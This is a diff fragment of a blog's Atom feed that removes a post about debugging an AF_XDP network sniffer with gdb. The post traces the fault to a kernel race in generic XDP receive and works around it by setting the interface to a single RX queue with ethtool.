-&lt;p&gt;The segmentation fault due the &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; pointer happen even when the
-addresses had the correct offsets (&lt;code class=&quot;highlighter-rouge&quot;&gt;pkt - umem-&amp;gt;base % frame_size ==
-headroom_size&lt;/code&gt;)&lt;/p&gt;
-
-&lt;p&gt;For the ones with incorrect offset, the address most common was the 0
-(&lt;code class=&quot;highlighter-rouge&quot;&gt;pkt - umem-&amp;gt;base == 0&lt;/code&gt;).&lt;/p&gt;
-
-&lt;p&gt;I hypothesized that I could be putting the address 0 by mistake in the
-FQ. Further testing shown that the 0 was never put in FQ but still being
-received in the RX queue.&lt;/p&gt;
-
-&lt;p&gt;So the RX queue was returning addresses that I never put in the FQ.
-Those are new addresses!&lt;/p&gt;
-
-&lt;p&gt;That explains the issue number 2: the application having more packets
-than it should.&lt;/p&gt;
-
-&lt;p&gt;Later, I found that 0 was not the only addresses with an incorrect
-offset (issue number 1).&lt;/p&gt;
-
-&lt;h3 id=&quot;poison-values&quot;&gt;Poison values&lt;/h3&gt;
-
-&lt;p&gt;Let’s print the packets as soon as they are read and the external object
-is set:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) set print pretty on
-
-(gdb) b do_work.c:19     // after the call to external_object()
-(gdb) commands
-&amp;gt; silent
-&amp;gt; p *pkt
-&amp;gt; cont
-&amp;gt; end
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The last packet printed before the segmentation fault (issue 3)
-was something like this&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-  timestamp = 121212121,
-  length = 60,
-  data = 0xsomeaddress
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And after the crash, the same packet looked like this:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-  timestamp = 0,
-  length = 60,
-  data = 0x0
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So the &lt;code class=&quot;highlighter-rouge&quot;&gt;timestamp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt; where zero’d. Was this done by the
-application or something else happen?&lt;/p&gt;
-
-&lt;p&gt;Perhaps a rouge &lt;code class=&quot;highlighter-rouge&quot;&gt;memset&lt;/code&gt;?&lt;/p&gt;
-
-&lt;p&gt;The fields are initialized to zero by the eBPF filter and overwritten by
-the application.&lt;/p&gt;
-
-&lt;p&gt;I decided to set them to non-trivial values, called &lt;em&gt;poison values&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;If a &lt;code class=&quot;highlighter-rouge&quot;&gt;memset&lt;/code&gt; zero’d them, I will notice.&lt;/p&gt;
-
-&lt;p&gt;This is the packet &lt;strong&gt;after&lt;/strong&gt; the crash:&lt;/p&gt;
-
-&lt;p&gt;&lt;label for=&quot;mmkd-2d4ae39ec8ffcd63da15ac50ce0f3e16&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mmkd-2d4ae39ec8ffcd63da15ac50ce0f3e16&quot; class=&quot;margin-toggle&quot; /&gt;&lt;/p&gt;
-&lt;div id=&quot;mk-mmkd-2d4ae39ec8ffcd63da15ac50ce0f3e16&quot;&gt;&lt;span class=&quot;marginnote marginmarkdowncode&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) p/x pkt-&amp;gt;timestamp
-0xdead
-&lt;/code&gt;&lt;/pre&gt;If you didn&amp;apos;t realize, the timestamp was not zero&amp;apos;d either.&lt;/span&gt;&lt;/div&gt;
-&lt;div&gt;&lt;script&gt;$(document).ready(function () {$('#mk-mmkd-2d4ae39ec8ffcd63da15ac50ce0f3e16 &gt; span').insertAfter($('#mmkd-2d4ae39ec8ffcd63da15ac50ce0f3e16'))});&lt;/script&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-  timestamp = 57005,
-  length = 60,
-  data = 0xbeaf
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So the whole structure was &lt;em&gt;not zero’d but reset&lt;/em&gt;, overwritten by
-the eBPF filter when the packet was supposed to be managed by user.&lt;/p&gt;
-
-&lt;p&gt;The three bugs are symptoms of the same unknown problem: the RX queue is
-returning invalid addresses, not only without the expected offset but
-addresses that belong to packets that the kernel still thinks that are
-free.&lt;/p&gt;
-
-&lt;h2 id=&quot;the-real-bug&quot;&gt;The real bug&lt;/h2&gt;
-
-&lt;p&gt;Something was wrong in the RX queue / kernel side so we started to
-search this issue in the web.&lt;/p&gt;
-
-&lt;p&gt;A college of mine found a candidate: the fix of a race condition in the
-generic receive path.&lt;/p&gt;
-
-&lt;p&gt;eBPF runs in the driver if this one supports it. If not, eBPF is
-executed in the kernel and the packets take a slightly larger path from
-the network card to user.&lt;/p&gt;
-
-&lt;p&gt;This path is known as the XDP generic path or just XDP generic.&lt;/p&gt;
-
-&lt;p&gt;Remember than the RX is a single-producer queue so it is not thread safe
-for concurrent pushes.&lt;/p&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-482d5a7a07746c31570f73c75afe4260&quot; class=&quot;margin-toggle &quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-482d5a7a07746c31570f73c75afe4260&quot; class=&quot;margin-toggle &quot; /&gt;&lt;span class=&quot;marginnote &quot;&gt;&lt;img style=&quot;max-width:120%;&quot; alt=&quot;RC on RX queue&quot; src=&quot;/book-of-gehn/assets/xdp-rx-rc/rx-rc-queues.png&quot; /&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;No problem when XDP runs in the driver but when it does in the generic
-mode, the kernel may be receiving several packets and pushing them
-&lt;strong&gt;concurrently&lt;/strong&gt; into the RX queue.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;“Unlike driver mode, generic xdp receive could be triggered
-by different threads on different CPU cores at the same time
-leading to the fill and rx queue breakage. For example, this
-could happen while sending packets from two processes to the
-first interface of &lt;code class=&quot;highlighter-rouge&quot;&gt;veth&lt;/code&gt; pair while the second part of it is
-open with &lt;code class=&quot;highlighter-rouge&quot;&gt;AF_XDP&lt;/code&gt; socket.&lt;/p&gt;
-
-  &lt;p&gt;Need to take a lock for each generic receive to avoid race.”
-&lt;cite class=&quot;epigraph&quot;&gt;&lt;a href=&quot;https://github.com/torvalds/linux/commit/bf0bdd1343efbbf65b4d53aef1fce14acbd79d50&quot;&gt;commit bf0bdd13&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The commit fixes the issue
-using a &lt;code class=&quot;highlighter-rouge&quot;&gt;spinlock&lt;/code&gt; but the fix was not backported.&lt;/p&gt;
-
-&lt;p&gt;And doing a kernel upgrade is &lt;strong&gt;not an option&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;single-queue&quot;&gt;Single queue&lt;/h2&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-3f29fa60e45a9506f034bbefc74e782a&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-3f29fa60e45a9506f034bbefc74e782a&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;The article
-&lt;a href=&quot;https://blog.packagecloud.io/eng/2016/06/22/monitoring-tuning-linux-networking-stack-receiving-data/&quot;&gt;Monitoring and Tuning the Linux Networking Stack: Receiving Data&lt;/a&gt;
-explains this wonderfully.
-&lt;br /&gt;
-Despite the name, the articule describes all the network stack from the
-driver to a TCP/UDP socket.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Once a packet is received by the network card a interruption is
-signaled. The interruption runs briefly and delegates the rest of the
-processing to a kernel thread named &lt;code class=&quot;highlighter-rouge&quot;&gt;ksoftirqd/n&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;The packet is put by the interruption into a queue to be consumed
-by a &lt;strong&gt;single&lt;/strong&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;ksoftirqd/n&lt;/code&gt; thread.&lt;/p&gt;
-
-&lt;p&gt;How the kernel can process multiple packet in parallel?&lt;/p&gt;
-
-&lt;p&gt;With multiple queues of course!&lt;/p&gt;
-
-&lt;p&gt;If we cannot upgrade the kernel we must enforce a single producer thread
-in the kernel side.&lt;/p&gt;
-
-&lt;p&gt;Configuring the interface to use a &lt;strong&gt;single&lt;/strong&gt; RX queue the kernel
-will use a &lt;strong&gt;single&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;ksoftirqd/n&lt;/code&gt; thread, a single-producer.&lt;/p&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-b547aee63f894013ca6bf9c81f006fac&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-b547aee63f894013ca6bf9c81f006fac&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;Try &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ethtool -L &amp;lt;iface&amp;gt; combined 1&lt;/code&gt; if the other does not work.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Thankfully the configuration is one liner:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ethtool &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &amp;lt;iface&amp;gt; rx 1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h2&gt;
-
-&lt;p&gt;This was hard. One innocently expects the bugs in the user application,
-not in the kernel.&lt;/p&gt;
-
-&lt;p&gt;And most of the time that’s true!&lt;/p&gt;
-
-&lt;p&gt;Debugging confirmed the opposite. And it was not easy.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;do_work&lt;/code&gt; shown is an oversimplification. The real code decouple the
-&lt;code class=&quot;highlighter-rouge&quot;&gt;read_packet&lt;/code&gt; from the processing from the &lt;code class=&quot;highlighter-rouge&quot;&gt;free_packet&lt;/code&gt; into a serie
-of threads.&lt;/p&gt;
-
-&lt;p&gt;And if debugging a multithreading application is not hard enough, putting a
-breakpoint in some places added enough delay that the bug was not
-trigger anymore.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Heisenbug&quot;&gt;Heisenbug!&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;GDB’s &lt;code class=&quot;highlighter-rouge&quot;&gt;set non-stop on&lt;/code&gt; helped to reduce the impact: when a breakpoint
-is hit by a thread, only that thread is stopped.&lt;/p&gt;
-
-&lt;p&gt;A special thanks to my college Mario that dug into kernel’s git log and
-found &lt;a href=&quot;https://github.com/torvalds/linux/commit/bf0bdd1343efbbf65b4d53aef1fce14acbd79d50&quot;&gt;commit bf0bdd13&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;That was the missing piece to solve this puzzle.&lt;/p&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://blog.packagecloud.io/eng/2016/06/22/monitoring-tuning-linux-networking-stack-receiving-data/&quot;&gt;Monitoring and Tuning the Linux Networking Stack: Receiving Data&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.infradead.org/~mchehab/rst_conversion/networking/scaling.html&quot;&gt;Scaling in the Linux Networking Stack&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.kernel.org/doc/html/latest/networking/af_xdp.html&quot;&gt;Linux AF_XDP&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Gehn</name></author><summary type="html">⊕ Picture this: you’d been developing for six months a network sniffer using XDP, a kernel in-pass in Linux. Six months and when you are about to release it, you find not one but three bugs that shake all your understanding of XDP. A debugging race against the clock begins.</summary></entry></feed>
+as belonging to.&lt;/figcaption&gt;&lt;/figure&gt;</content><author><name>Gehn</name></author><summary type="html"></summary></entry></feed>
